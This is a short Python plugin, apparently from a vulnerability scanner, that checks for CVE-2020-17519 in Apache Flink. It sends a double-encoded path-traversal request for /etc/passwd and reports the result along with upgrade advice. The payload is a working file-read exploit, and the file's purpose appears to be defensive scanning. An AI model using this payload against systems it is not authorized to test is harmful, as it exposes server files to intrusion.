#!/usr/bin/env python3
# coding=utf-8

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    path = "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
    url = "{}://{}:{}/jobmanager/logs/{}".format(service, ip, port, path)

    try:
        r = await http_client(ip, port).get(url, timeout=20)
        if 'root:x:0' in r.text:
            ret = {
                'alert_group': 'Flink LFI CVE-2020-17519',
                'affects': '{}'.format(url),
                'details': u'通过发送请求, 可获取服务器上任意文件内容如 /etc/passwd:\n'
                           u'可升级至 Apache Flink 1.12.0 或者 1.11.3\n{}'.format(r.text[:100])
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 21684, 'http', True, task_msg={})
    run_plugin_test(scan)
